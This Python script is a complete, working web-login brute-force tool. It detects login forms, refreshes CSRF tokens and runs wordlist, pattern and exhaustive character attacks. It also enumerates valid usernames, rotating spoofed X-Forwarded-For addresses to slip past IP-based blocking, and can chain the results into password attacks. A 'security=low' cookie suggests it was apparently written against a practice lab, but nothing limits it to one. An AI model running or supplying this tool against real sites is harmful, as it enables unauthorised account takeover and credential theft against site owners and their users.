import requests
import requests.exceptions
from bs4 import BeautifulSoup
from termcolor import colored
from datetime import datetime
import time
import itertools
import string
import sys

# ─── BANNER ───────────────────────────────────────────────────
def print_banner():
    print(colored("""
╔═══════════════════════════════════════════════════╗
║         SCYFIX BRUTE FORCER v2.1                  ║
║      Web Login Brute Force & Wordlist Attack      ║
║    CSRF Support | Username Enumeration | XFF      ║
╚═══════════════════════════════════════════════════╝
""", 'cyan'))

# ─── FORM DETECTION ───────────────────────────────────────────
def detect_form(url, session):
    print(colored("\n[*] Detecting login form...", 'cyan'))
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'lxml')
        form = soup.find('form')

        if not form:
            print(colored("[-] No form detected on page", 'red'))
            return None, None, None, None

        method = form.get('method', 'post').lower()
        action = form.get('action', url)
        if not action.startswith('http'):
            base_path = url.rsplit('/', 1)[0]
            action = base_path + '/' + action.lstrip('/')

        fields = {}
        submit_fields = {}
        for input_tag in form.find_all('input'):
            name = input_tag.get('name')
            value = input_tag.get('value', '')
            input_type = input_tag.get('type', 'text').lower()
            if name:
                if input_type == 'submit':
                    submit_fields[name] = value
                else:
                    fields[name] = value

        all_fields = {**fields, **submit_fields}

        print(colored(f"  [+] Form method: {method.upper()}", 'green'))
        print(colored(f"  [+] Form action: {action}", 'green'))
        print(colored(f"  [+] Input fields: {list(fields.keys())}", 'green'))
        print(colored(f"  [+] Submit fields: {list(submit_fields.keys())}", 'green'))

        csrf_field = detect_csrf_field(fields)
        if csrf_field:
            print(colored(f"  [!] CSRF token detected: {csrf_field}", 'yellow'))
        else:
            print(colored("  [+] No CSRF token detected", 'green'))

        return method, action, all_fields, response

    except Exception as e:
        print(colored(f"[-] Error detecting form: {e}", 'red'))
        return None, None, None, None

# ─── CSRF TOKEN DETECTION ─────────────────────────────────────
def detect_csrf_field(fields):
    csrf_names = [
        'csrf', 'token', 'csrf_token', '_token',
        'authenticity_token', 'user_token', '_csrf',
        'csrfmiddlewaretoken', 'csrf_field'
    ]
    for field in fields:
        if field.lower() in csrf_names:
            return field
    return None

# ─── FETCH FRESH CSRF TOKEN ───────────────────────────────────
def get_fresh_token(url, session, csrf_field):
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'lxml')
        token_input = soup.find('input', {'name': csrf_field})
        if token_input:
            return token_input.get('value', '')
    except Exception:
        pass
    return None

# ─── IDENTIFY USERNAME AND PASSWORD FIELDS ────────────────────
def identify_fields(fields, submit_fields):
    username_keys = ['username', 'user', 'email', 'uname', 'usr']
    password_keys = ['password', 'pass', 'passwd', 'pwd', 'passw']

    username_field = None
    password_field = None

    for key in fields:
        if key.lower() in username_keys and key not in submit_fields:
            username_field = key
        if key.lower() in password_keys and key not in submit_fields:
            password_field = key

    if not username_field:
        print(colored("\n[!] Could not auto-detect username field", 'yellow'))
        print(colored(f"    Available fields: {list(fields.keys())}", 'yellow'))
        username_field = input(colored("    Enter username field name manually: ", 'yellow'))

    if not password_field:
        print(colored("[!] Could not auto-detect password field", 'yellow'))
        print(colored(f"    Available fields: {list(fields.keys())}", 'yellow'))
        password_field = input(colored("    Enter password field name manually: ", 'yellow'))

    print(colored(f"\n  [+] Username field: {username_field}", 'green'))
    print(colored(f"  [+] Password field: {password_field}", 'green'))

    return username_field, password_field

# ─── ATTEMPT LOGIN ────────────────────────────────────────────
def attempt_login(url, session, method, action, fields, username_field,
                  password_field, username, password, fail_string,
                  delay, csrf_field, xff_ip=None):

    if csrf_field:
        fresh_token = get_fresh_token(url, session, csrf_field)
        if fresh_token:
            fields[csrf_field] = fresh_token

    fields[username_field] = username
    fields[password_field] = password

    headers = {}
    if xff_ip:
        headers['X-Forwarded-For'] = xff_ip

    try:
        if method == 'post':
            response = session.post(
                action, data=fields, timeout=10, allow_redirects=True, headers=headers
            )
        else:
            response = session.get(
                action, params=fields, timeout=10, allow_redirects=True, headers=headers
            )

        time.sleep(delay)

        if fail_string in response.text:
            return False
        else:
            return True

    except requests.exceptions.ConnectionError:
        print(colored("\n[!] Connection error -- target may be blocking requests", 'red'))
        time.sleep(5)
        return False
    except requests.exceptions.Timeout:
        print(colored("\n[!] Request timed out", 'red'))
        return False

# ─── WORDLIST ATTACK ──────────────────────────────────────────
def wordlist_attack(url, session, method, action, fields, username_field,
                    password_field, usernames, password_file, fail_string,
                    delay, csrf_field):
    print(colored("\n[*] Starting wordlist attack...", 'cyan'))

    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(colored(f"[-] Password file not found: {password_file}", 'red'))
        return None

    total = len(passwords)
    print(colored(f"[*] Loaded {total} passwords from wordlist", 'cyan'))

    for username in usernames:
        print(colored(f"\n[*] Attacking username: {username}", 'yellow'))
        for count, password in enumerate(passwords, 1):
            password = password.strip()
            sys.stdout.write(colored(
                f"\r  [*] Trying ({count}/{total}): {password:<30}", 'red'
            ))
            sys.stdout.flush()

            if attempt_login(url, session, method, action, fields, username_field,
                           password_field, username, password, fail_string,
                           delay, csrf_field):
                print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                print(colored(f"  [+] Username: {username}", 'green'))
                print(colored(f"  [+] Password: {password}", 'green'))
                return username, password

    print(colored("\n\n[-] Wordlist exhausted -- password not found", 'red'))
    return None

# ─── PATTERN ATTACK ───────────────────────────────────────────
def pattern_attack(url, session, method, action, fields, username_field,
                   password_field, usernames, fail_string, delay, csrf_field):
    print(colored("\n[*] Starting pattern attack...", 'cyan'))

    current_year = datetime.now().year
    patterns = []

    for username in usernames:
        base = username.lower()
        cap = username.capitalize()
        patterns += [
            base, cap,
            base + '123', cap + '123',
            base + '1234', cap + '1234',
            base + str(current_year), cap + str(current_year),
            base + '!', cap + '!',
            base + '@123', cap + '@123',
            'password', 'Password',
            'password123', 'Password123',
            'password!', 'Password!',
            '123456', '12345678',
            'admin', 'Admin',
            'admin123', 'Admin123',
            'letmein', 'Letmein123',
            'welcome', 'Welcome1',
            'qwerty', 'Qwerty123',
        ]

    total = len(patterns)
    for username in usernames:
        print(colored(f"\n[*] Pattern attack on username: {username}", 'yellow'))
        for count, password in enumerate(patterns, 1):
            sys.stdout.write(colored(
                f"\r  [*] Trying ({count}/{total}): {password:<30}", 'red'
            ))
            sys.stdout.flush()

            if attempt_login(url, session, method, action, fields, username_field,
                           password_field, username, password, fail_string,
                           delay, csrf_field):
                print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                print(colored(f"  [+] Username: {username}", 'green'))
                print(colored(f"  [+] Password: {password}", 'green'))
                return username, password

    print(colored("\n\n[-] Pattern attack complete -- password not found", 'red'))
    return None

# ─── BRUTE FORCE ATTACK ───────────────────────────────────────
def bruteforce_attack(url, session, method, action, fields, username_field,
                      password_field, usernames, fail_string, delay,
                      min_len, max_len, charset, csrf_field):
    print(colored("\n[*] Starting character brute force attack...", 'cyan'))
    print(colored("[!] Warning -- this may take a very long time", 'yellow'))

    for username in usernames:
        print(colored(f"\n[*] Brute forcing username: {username}", 'yellow'))
        for length in range(min_len, max_len + 1):
            for combo in itertools.product(charset, repeat=length):
                password = ''.join(combo)
                sys.stdout.write(colored(
                    f"\r  [*] Trying: {password:<20}", 'red'
                ))
                sys.stdout.flush()

                if attempt_login(url, session, method, action, fields,
                               username_field, password_field, username,
                               password, fail_string, delay, csrf_field):
                    print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                    print(colored(f"  [+] Username: {username}", 'green'))
                    print(colored(f"  [+] Password: {password}", 'green'))
                    return username, password

    print(colored("\n\n[-] Brute force complete -- password not found", 'red'))
    return None

# ─── USERNAME ENUMERATION ─────────────────────────────────────
def username_enum(url, session, method, action, all_fields, username_field,
                  password_field, username_file, fail_string, password,
                  delay, csrf_field, use_xff):
    print(colored("\n[*] Starting username enumeration...", 'cyan'))

    try:
        with open(username_file, 'r', encoding='utf-8', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(colored(f"[-] Username file not found: {username_file}", 'red'))
        return []

    total = len(usernames)
    print(colored(f"[*] Loaded {total} usernames from wordlist", 'cyan'))
    print(colored(f"[*] Fixed password: {password}", 'cyan'))
    if use_xff:
        print(colored("[*] X-Forwarded-For rotation: ENABLED", 'yellow'))
    else:
        print(colored("[*] X-Forwarded-For rotation: disabled", 'cyan'))

    print(colored(f"\n[*] Enumeration started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
    print(colored("=" * 55, 'cyan'))

    valid_usernames = []

    for count, username in enumerate(usernames, 1):
        xff_ip = f"10.{(count // 65025) % 256}.{(count // 255) % 256}.{count % 255}" if use_xff else None

        sys.stdout.write(colored(
            f"\r  [*] Trying ({count}/{total}): {username:<30}", 'red'
        ))
        sys.stdout.flush()

        if attempt_login(url, session, method, action, all_fields, username_field,
                         password_field, username, password, fail_string,
                         delay, csrf_field, xff_ip=xff_ip):
            print(colored(f"\n  [!] VALID USERNAME FOUND: {username}", 'green'))
            valid_usernames.append(username)

    print(colored(f"\n\n[*] Enumeration complete at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))

    if valid_usernames:
        print(colored(f"\n[+] Valid usernames found: {valid_usernames}", 'green'))
    else:
        print(colored("[-] No valid usernames found", 'red'))

    return valid_usernames

# ─── MAIN ─────────────────────────────────────────────────────
def main():
    print_banner()

    print(colored("[*] Select attack mode:", 'cyan'))
    print(colored("  1. Wordlist attack", 'white'))
    print(colored("  2. Pattern attack (common passwords + username variations)", 'white'))
    print(colored("  3. Character brute force", 'white'))
    print(colored("  4. All of the above (wordlist first then pattern then brute force)", 'white'))
    print(colored("  5. Username enumeration", 'white'))
    mode = input(colored("\n[*] Enter mode (1/2/3/4/5): ", 'cyan'))

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })

    if mode == '5':
        url = input(colored("[*] Enter target login URL: ", 'cyan'))
        username_file = input(colored("[*] Enter path to username wordlist: ", 'cyan')).strip()
        fail_string = input(colored("[*] Enter string that appears when login FAILS: ", 'cyan'))
        password = input(colored("[*] Enter fixed password to use (default: password): ", 'cyan')).strip()
        if not password:
            password = 'password'
        delay = input(colored("[*] Delay between attempts in seconds (default 0.5): ", 'cyan'))
        delay = float(delay) if delay.strip() else 0.5
        xff = input(colored("[*] Enable X-Forwarded-For IP rotation? (y/n): ", 'cyan')).strip().lower()
        use_xff = xff == 'y'

        session.get(url, timeout=10)
        session.cookies.set('security', 'low')

        method, action, all_fields, _ = detect_form(url, session)
        if not method:
            print(colored("[-] Could not detect form -- exiting", 'red'))
            return

        submit_field_names = ['login', 'submit', 'signin', 'btn', 'button']
        submit_fields = {k: v for k, v in all_fields.items()
                        if k.lower() in submit_field_names}
        input_fields = {k: v for k, v in all_fields.items()
                       if k.lower() not in submit_field_names}

        username_field, password_field = identify_fields(input_fields, submit_fields)
        csrf_field = detect_csrf_field(input_fields)

        valid_usernames = username_enum(url, session, method, action, all_fields,
                                        username_field, password_field, username_file,
                                        fail_string, password, delay, csrf_field, use_xff)

        if valid_usernames:
            chain = input(colored("\n[*] Run password attack on found usernames? (y/n): ", 'cyan')).strip().lower()
            if chain == 'y':
                fail_string2 = input(colored("[*] Fail string for password attack (ENTER to reuse): ", 'cyan')).strip()
                if not fail_string2:
                    fail_string2 = fail_string
                delay2 = input(colored("[*] Delay for password attack (default 0.5): ", 'cyan'))
                delay2 = float(delay2) if delay2.strip() else 0.5
                print(colored("\n[*] Select password attack mode:", 'cyan'))
                print(colored("  1. Wordlist  2. Pattern  3. Brute force  4. All", 'white'))
                pw_mode = input(colored("[*] Enter mode (1-4): ", 'cyan'))

                result = None
                if pw_mode in ['1', '4']:
                    password_file = input(colored("[*] Enter path to password file: ", 'cyan'))
                    result = wordlist_attack(url, session, method, action, all_fields,
                                            username_field, password_field, valid_usernames,
                                            password_file, fail_string2, delay2, csrf_field)
                if pw_mode in ['2', '4'] and not result:
                    result = pattern_attack(url, session, method, action, all_fields,
                                            username_field, password_field, valid_usernames,
                                            fail_string2, delay2, csrf_field)
                if pw_mode in ['3', '4'] and not result:
                    min_len = int(input(colored("[*] Minimum password length: ", 'cyan')))
                    max_len = int(input(colored("[*] Maximum password length: ", 'cyan')))
                    print(colored("[*] Select character set:", 'cyan'))
                    print(colored("  1. Lowercase  2. Lowercase+num  3. Lower+upper+num  4. All", 'white'))
                    charset_choice = input(colored("[*] Enter choice (1/2/3/4): ", 'cyan'))
                    charsets = {
                        '1': string.ascii_lowercase,
                        '2': string.ascii_lowercase + string.digits,
                        '3': string.ascii_letters + string.digits,
                        '4': string.ascii_letters + string.digits + string.punctuation
                    }
                    charset = charsets.get(charset_choice, string.ascii_lowercase)
                    result = bruteforce_attack(url, session, method, action, all_fields,
                                              username_field, password_field, valid_usernames,
                                              fail_string2, delay2, min_len, max_len,
                                              charset, csrf_field)
        return

    # Modes 1-4: standard password attacks
    url = input(colored("[*] Enter target login URL: ", 'cyan'))
    usernames_input = input(colored("[*] Enter username(s) to attack (comma separated): ", 'cyan'))
    usernames = [u.strip() for u in usernames_input.split(',')]
    fail_string = input(colored("[*] Enter string that appears when login FAILS: ", 'cyan'))
    delay = input(colored("[*] Delay between attempts in seconds (default 0.5): ", 'cyan'))
    delay = float(delay) if delay.strip() else 0.5

    # Visit page first to get natural PHPSESSID then set security to low
    session.get(url, timeout=10)
    session.cookies.set('security', 'low')

    method, action, all_fields, _ = detect_form(url, session)
    if not method:
        print(colored("[-] Could not detect form -- exiting", 'red'))
        return

    submit_field_names = ['login', 'submit', 'signin', 'btn', 'button']
    submit_fields = {k: v for k, v in all_fields.items()
                    if k.lower() in submit_field_names}
    input_fields = {k: v for k, v in all_fields.items()
                   if k.lower() not in submit_field_names}

    username_field, password_field = identify_fields(input_fields, submit_fields)
    csrf_field = detect_csrf_field(input_fields)

    print(colored(f"\n[*] Attack started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
    print(colored("=" * 55, 'cyan'))

    result = None

    if mode == '1' or mode == '4':
        password_file = input(colored("[*] Enter path to password file: ", 'cyan'))
        result = wordlist_attack(url, session, method, action, all_fields,
                                username_field, password_field, usernames,
                                password_file, fail_string, delay, csrf_field)

    if (mode == '2' or mode == '4') and not result:
        result = pattern_attack(url, session, method, action, all_fields,
                               username_field, password_field, usernames,
                               fail_string, delay, csrf_field)

    if (mode == '3' or mode == '4') and not result:
        min_len = int(input(colored("[*] Minimum password length: ", 'cyan')))
        max_len = int(input(colored("[*] Maximum password length: ", 'cyan')))
        print(colored("[*] Select character set:", 'cyan'))
        print(colored("  1. Lowercase letters only", 'white'))
        print(colored("  2. Lowercase + numbers", 'white'))
        print(colored("  3. Lowercase + uppercase + numbers", 'white'))
        print(colored("  4. All characters including symbols", 'white'))
        charset_choice = input(colored("[*] Enter choice (1/2/3/4): ", 'cyan'))

        charsets = {
            '1': string.ascii_lowercase,
            '2': string.ascii_lowercase + string.digits,
            '3': string.ascii_letters + string.digits,
            '4': string.ascii_letters + string.digits + string.punctuation
        }
        charset = charsets.get(charset_choice, string.ascii_lowercase)

        result = bruteforce_attack(url, session, method, action, all_fields,
                                  username_field, password_field, usernames,
                                  fail_string, delay, min_len, max_len,
                                  charset, csrf_field)

    print(colored(f"\n[*] Attack completed at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))

    if not result:
        print(colored("[-] No valid credentials found", 'red'))

if __name__ == "__main__":
    main()
